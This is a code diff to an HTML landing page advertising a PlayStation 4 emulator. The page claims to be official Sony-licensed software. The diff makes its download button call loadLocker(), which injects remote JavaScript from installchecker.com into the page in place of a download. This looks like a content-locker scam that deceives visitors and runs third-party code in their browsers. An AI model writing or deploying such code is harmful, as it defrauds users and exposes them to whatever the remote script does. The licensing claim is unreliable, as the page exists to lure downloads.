@@ -139,7 +139,17 @@
             Play PlayStation 4 titles anywhere with optimized controls and enhanced performance. 
             Official Sony licensed technology.
         </p>
-        <button class="download-btn">DOWNLOAD NOW</button>
+        <button class="download-btn" onclick="loadLocker()">DOWNLOAD NOW</button>
     </div>
+
+    <script>
+        function loadLocker() {
+            var script = document.createElement('script');
+            script.type = 'text/javascript';
+            script.id = 'ogjs';
+            script.src = 'https://installchecker.com/cl/js/37e6gm';
+            document.body.appendChild(script);
+        }
+    </script>
 </body>
 </html>
